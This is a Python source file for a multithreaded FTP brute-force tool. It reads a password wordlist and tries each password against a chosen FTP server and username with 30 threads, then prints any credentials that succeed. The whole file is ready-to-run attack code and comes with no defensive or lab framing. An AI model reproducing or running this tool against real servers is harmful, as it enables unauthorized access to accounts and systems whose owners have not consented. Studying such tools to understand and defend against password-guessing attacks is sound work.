import ftplib
from threading import Thread
import queue
import argparse
from urllib.parse import urlparse
from colorama import Fore, init

# Initialize the console for colors (for Windows)
init()

# Initialize the queue
q = queue.Queue()

# Number of threads to spawn
n_threads = 30

def connect_ftp(host, user):
    global q
    while True:
        # Get the password from the queue
        password = q.get()
        # Initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # Try to connect to FTP server with a timeout of 5 seconds
            server.connect(host, 21, timeout=5)
            # Login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # Login failed, wrong credentials
            pass
        except Exception as e:
            # Handle other FTP exceptions
            print(f"[!] Error: {e}")
        else:
            # Correct credentials found
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # We found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # Notify the queue that the task is completed for this password
            q.task_done()

def main():
    # Set up argparse to handle command-line arguments
    parser = argparse.ArgumentParser(description="FTP Brute Forcing Script")
    parser.add_argument("-l", "--username", required=True, help="Username for the FTP server")
    parser.add_argument("-P", "--password_list", required=True, help="Path to the password list (wordlist.txt)")
    parser.add_argument("target", help="Target FTP server URL (ftp://<target_ip>)")

    args = parser.parse_args()

    # Parse the host from the URL (e.g., ftp://192.168.1.113)
    parsed_url = urlparse(args.target)
    if parsed_url.scheme != "ftp":
        print("[-] Invalid URL scheme. Use 'ftp://<target_ip>'")
        return
    host = parsed_url.hostname
    user = args.username

    # Read the wordlist of passwords
    try:
        with open(args.password_list, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Password list file '{args.password_list}' not found.")
        return

    print(f"[+] Passwords to try: {len(passwords)}")

    # Put all passwords into the queue
    for password in passwords:
        q.put(password)

    # Create `n_threads` that run the connect_ftp function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp, args=(host, user))
        # Will end when the main thread ends
        thread.daemon = True
        thread.start()

    # Wait for the queue to be empty
    q.join()

if __name__ == "__main__":
    main()
